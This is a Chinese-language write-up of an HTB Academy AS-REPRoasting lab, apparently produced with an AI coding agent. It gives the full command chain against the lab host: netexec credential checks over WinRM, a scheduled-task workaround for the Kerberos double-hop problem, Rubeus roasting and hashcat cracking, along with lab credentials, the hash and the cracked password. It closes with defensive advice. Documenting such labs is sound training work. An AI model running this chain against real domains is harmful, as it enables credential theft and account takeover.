# AS-REPRoasting — Writeup

> HTB Academy / Kerberos Attacks 模組
> 目標：`10.129.205.26` (ACADEMY-KERBATTCK-WS01)
> 授權帳號：`INLANEFREIGHT\htb-student : HTB_@cademy_stdnt!`
> 日期：2026-11-16

---

## 答案

| 題目 | 答案 |
|------|------|
| q1 — 名稱以 `ca` 開頭、可被 AS-REProast 的帳號 | **`carole.rose`** |
| q2 — 該帳號的密碼 | **`jasmine`** |

AS-REP hash（hashcat mode 18200）：

```
$krb5asrep$23$carole.rose@INLANEFREIGHT.LOCAL:6BB97C56EE17687F731BEEBD6B85353E$DE415BCD...E4F
```

---

## 0. 什麼是 AS-REPRoasting（為什麼這題能打）

Kerberos 認證第一步是 AS-REQ / AS-REP。正常情況下，帳號必須先做
**Kerberos pre-authentication**：用自己的密碼雜湊加密一個時間戳送給 KDC，KDC
驗證成功後才回 AS-REP（裡面含用帳號密碼雜湊加密的 session key）。

若某帳號的屬性 `userAccountControl` 設了
**`DONT_REQ_PREAUTH`（bit `0x400000` = 4194304）**，KDC 不做 pre-auth 驗證，
**任何人不用密碼就能向 KDC 要到該帳號的 AS-REP**。AS-REP 裡有一段用帳號密碼
雜湊（RC4/AES）加密的資料，可離線暴力破解 → 拿到明文密碼。

LDAP 過濾器（Rubeus 內部就是用這個找目標）：

```
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

`1.2.840.113556.1.4.803` 是 LDAP 的 bitwise-AND matching rule，用來比對
`userAccountControl` 的某個 bit。

---

## 1. 偵察 — 目標是工作站，不是 DC

先確認連通性與開放埠：

```bash
ping -c 2 10.129.205.26
nc -zv -w3 10.129.205.26 3389      # RDP  → open
for p in 88 389 445 135; do nc -zv -w3 10.129.205.26 $p; done
```

結果：

```
88  (Kerberos) → Connection refused
389 (LDAP)     → Connection refused
445 (SMB)      → open
135 (RPC)      → open
3389 / 5985    → open
```

**關鍵判斷**：`88`、`389` 沒開 → 這台 `10.129.205.26` 是**網域成員工作站
（WS01）**，不是網域控制站（DC）。DC（後面查到是 `DC01.INLANEFREIGHT.LOCAL`）
我的 Kali 主機**碰不到**。所以攻擊鏈必須**透過 WS01 轉送**：由 WS01 去跟 DC
講 LDAP / Kerberos，我只能遠端操控 WS01。

這也解釋了為什麼不能在本機直接用 `impacket-GetNPUsers`（它要直連 DC 的 88 埠）。

---

## 2. 驗證憑證與權限（取代手動 RDP）

題目叫我 RDP，但 RDP 是圖形介面、難自動化。既然 SMB / WinRM 都開，先用
`netexec` 驗證 `htb-student` 的憑證與權限：

```bash
nxc smb   10.129.205.26 -u htb-student -p 'HTB_@cademy_stdnt!'
nxc winrm 10.129.205.26 -u htb-student -p 'HTB_@cademy_stdnt!'
```

輸出：

```
SMB   ... (domain:INLANEFREIGHT.LOCAL) ...
SMB   [+] INLANEFREIGHT.LOCAL\htb-student:HTB_@cademy_stdnt! (Pwn3d!)
WINRM [+] INLANEFREIGHT.LOCAL\htb-student:HTB_@cademy_stdnt! (Pwn3d!)
```

得知：網域 `INLANEFREIGHT.LOCAL`，且 `htb-student` 在 WS01 是**本機管理員**
（`Pwn3d!`）、WinRM 可用。→ 用 `nxc winrm -X '<PowerShell>'` 遠端下指令，
全程不需進圖形桌面。

工具箱在 `C:\Tools`（列出得知）：

```
Rubeus.exe  PowerView.ps1  mimikatz.exe  hashcat-6.2.6  rockyou.txt  ...
```

---

## 3. 卡關點：Kerberos Double-Hop（這題最容易失敗的地方）

第一次直接跑 Rubeus：

```bash
nxc winrm 10.129.205.26 -u htb-student -p 'HTB_@cademy_stdnt!' \
  -X 'C:\Tools\Rubeus.exe asreproast /format:hashcat /nowrap'
```

結果 LDAP 查詢直接報錯：

```
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/...' for '(&(samAccountType=805306368)...)'
[X] Error executing the domain searcher: An operations error occurred.
[X] Error during executing the LDAP query.
```

**原因 = Kerberos 雙躍點（double-hop）問題，不是指令或概念錯。**

- 我透過 WinRM 登入 WS01，這是一個 **network logon**。
- network logon 的 token **不含可再往外傳的憑證**（沒有 TGT、也沒有明文密碼）。
- Rubeus 要去跟 **第二台機器 DC01** 做 LDAP 查詢 → 這是「第二跳」。
- 第二跳沒有任何憑證可用 → DC 回 `An operations error occurred`（匿名綁定被拒）。

一句話：**第一跳（我→WS01）帶了憑證，第二跳（WS01→DC01）憑證掉了。**

### 試過但失敗的修法（也記錄下來）

**嘗試 A：`Start-Process -Credential`**（用明文憑證另開一個帶密碼的行程）

```powershell
$p = ConvertTo-SecureString 'HTB_@cademy_stdnt!' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\htb-student',$p)
Start-Process C:\Tools\Rubeus.exe -ArgumentList 'asreproast ...' -Credential $c -Wait ...
```

→ 失敗：`This command cannot be run due to the error: Access is denied.`
network logon 的 token 缺少用別人憑證建立 primary token 的權限
（`SeAssignPrimaryTokenPrivilege` / `SeTcbPrivilege`），所以 `-Credential` 被拒。

### 成功的修法：排程工作（Scheduled Task）帶密碼執行

`schtasks /ru <user> /rp <password>` 建立的工作，執行時是一個
**batch logon（type 4）而且帶著明文密碼** → 產生的 token **含可往外傳的憑證**，
第二跳 LDAP / Kerberos 就能通。這是 WinRM 下繞過 double-hop 最乾淨的做法之一
（其他選項：CredSSP、`runas /netonly`、RDP 互動登入）。

> 踩雷提醒：`schtasks /tr` 對含空白與分號的指令會把參數切斷
> （`ERROR: Invalid argument/option`）。**正解是先把指令寫成 `.ps1` 腳本檔，
> 工作只呼叫 `powershell -ep bypass -File <script>`**，不要把整串塞進 `/tr`。

---

## 4. 列舉可被 AS-REProast 的帳號

先把 PowerView 查詢寫成腳本（LDAP 查詢很快，先確定目標名稱，再精準 roast）：

```powershell
# 在 WS01 建立 C:\Users\Public\enum.ps1
Import-Module C:\Tools\PowerView.ps1
Get-DomainUser -PreauthNotRequired |
  Select samaccountname,userprincipalname | Format-List |
  Out-File C:\Users\Public\preauth.txt
```

用排程工作（帶密碼）執行它：

```bash
nxc winrm ... -X '
Set-Content C:\Users\Public\enum.ps1 -Value "Import-Module C:\Tools\PowerView.ps1; Get-DomainUser -PreauthNotRequired | Select samaccountname,userprincipalname | Format-List | Out-File C:\Users\Public\preauth.txt"
schtasks /create /tn enum /tr "powershell -ep bypass -File C:\Users\Public\enum.ps1" /sc once /st 00:00 /ru INLANEFREIGHT\htb-student /rp "HTB_@cademy_stdnt!" /rl highest /f
schtasks /run /tn enum
Start-Sleep 12
schtasks /delete /tn enum /f
Get-Content C:\Users\Public\preauth.txt'
```

結果：

```
samaccountname : amber.smith
samaccountname : jenna.smith
samaccountname : carole.rose        <-- 以 "ca" 開頭 = q1 答案
```

**q1 = `carole.rose`**

---

## 5. 取得 AS-REP hash

針對單一帳號 roast（只要一次 AS-REQ，很快；廣域 `asreproast` 在這 lab 會卡很久）。
一樣用排程工作跑：

```powershell
# C:\Users\Public\roast.ps1
C:\Tools\Rubeus.exe asreproast /user:carole.rose /format:hashcat /nowrap /outfile:C:\Users\Public\carole.hash
```

```bash
nxc winrm ... -X '
Set-Content C:\Users\Public\roast.ps1 -Value "C:\Tools\Rubeus.exe asreproast /user:carole.rose /format:hashcat /nowrap /outfile:C:\Users\Public\carole.hash"
schtasks /create /tn roast /tr "powershell -ep bypass -File C:\Users\Public\roast.ps1" /sc once /st 00:00 /ru INLANEFREIGHT\htb-student /rp "HTB_@cademy_stdnt!" /rl highest /f
schtasks /run /tn roast
Start-Sleep 12
schtasks /delete /tn roast /f
Get-Content C:\Users\Public\carole.hash'
```

拿到：

```
$krb5asrep$23$carole.rose@INLANEFREIGHT.LOCAL:6BB97C56EE17687F731BEEBD6B85353E$DE415BCD...E4F
```

---

## 6. 離線破解

在本機用 hashcat，mode **18200**（Kerberos 5 AS-REP etype 23 / RC4），字典
`rockyou.txt`：

```bash
# 把 hash 存成檔案（注意：Claude Code 每個 Bash 呼叫 cwd 會重置，要用絕對路徑）
printf '%s\n' '$krb5asrep$23$carole.rose@...E4F' > /tmp/carole.hash

hashcat -m 18200 /tmp/carole.hash /usr/share/wordlists/rockyou.txt -O
```

結果：

```
$krb5asrep$23$carole.rose@INLANEFREIGHT.LOCAL:...:jasmine
Status...........: Cracked
```

**q2 = `jasmine`**

> 踩雷提醒：第一次 `hashcat ... carole.hash`（相對路徑）報
> `Hash parsing error: Separator unmatched` / `No hashes loaded`，其實是因為
> **cwd 重置導致找不到檔案、hashcat 把檔名字串當成 hash 在解析**。改用絕對路徑即解決。

---

## 7. 善後

移除在 WS01 落下的檔案與排程工作（維持環境乾淨）：

```powershell
Remove-Item C:\Users\Public\asrep.txt,C:\Users\Public\preauth.txt,`
  C:\Users\Public\enum.ps1,C:\Users\Public\roast.ps1,C:\Users\Public\carole.hash -ErrorAction SilentlyContinue
# 三個排程工作在步驟中已 /delete
```

---

## 攻擊鏈總結

```
偵察（88/389 關閉 → WS01 是成員機，DC 碰不到）
      │
      ▼
nxc winrm 驗證 htb-student（本機 admin，WinRM 可用）
      │
      ▼
Rubeus 直接跑 → LDAP「An operations error」 = Kerberos double-hop
      │
      ▼
排程工作帶密碼執行（batch logon 帶憑證）繞過 double-hop
      │
      ├─ PowerView Get-DomainUser -PreauthNotRequired → carole.rose   (q1)
      │
      ▼
Rubeus asreproast /user:carole.rose → $krb5asrep hash
      │
      ▼
hashcat -m 18200 + rockyou → jasmine                                 (q2)
```

## 學到的重點

1. **先判斷目標角色**：埠 88/389 沒開代表不是 DC，攻擊鏈要繞成員機轉送。
2. **Double-hop 是本題真正卡點**：WinRM/PSRemoting 的 network logon 不帶可轉送
   憑證，第二跳的 LDAP/Kerberos 必定失敗。排程工作（帶密碼）、CredSSP、
   `runas /netonly`、或互動式 RDP 都能解。
3. **先列舉、再精準 roast**：廣域 `asreproast` 在高延遲 lab 會卡，先用 PowerView
   找出目標名稱，再 `/user:` 針對單一帳號，又快又準。
4. 防禦面：不要給帳號設 `DONT_REQ_PREAUTH`；用強密碼讓離線破解失效；監控
   不含 pre-auth 的 AS-REQ（Event ID 4768，pre-auth type 0）。
